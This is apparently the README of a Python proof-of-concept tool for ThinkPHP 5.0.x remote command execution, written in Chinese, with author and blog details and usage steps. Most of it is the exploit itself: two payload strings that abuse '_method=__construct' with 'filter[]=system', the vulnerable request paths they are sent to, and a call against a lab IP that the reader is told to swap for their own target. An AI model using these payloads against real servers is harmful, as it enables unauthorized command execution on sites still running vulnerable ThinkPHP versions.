# 简介

    author:jeffery.yu
    script is maded by python3
    blog: https://www.yu2lulu.xyz
    descibe: thinkphp5.x远程命令执行
        受影响版本：ThinkPHP 5.0.x
        不受影响版本：ThinkPHP 5.0.24


# 使用方法
### 1.修改代码
    if __name__=="__main__":
    exp1="_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=env"
    exp2="s=env&_method=__construct&method=&filter[]=system"
    exp={
        '/public/index.php?s=captcha':exp1,
        '/public/index.php?s=index/index/index':exp2
    }
    Poc("http://10.211.55.6:12306",exp)  #修改为你的ip和端口即可
    
### 2.python tp5.x远程命令执行.py 
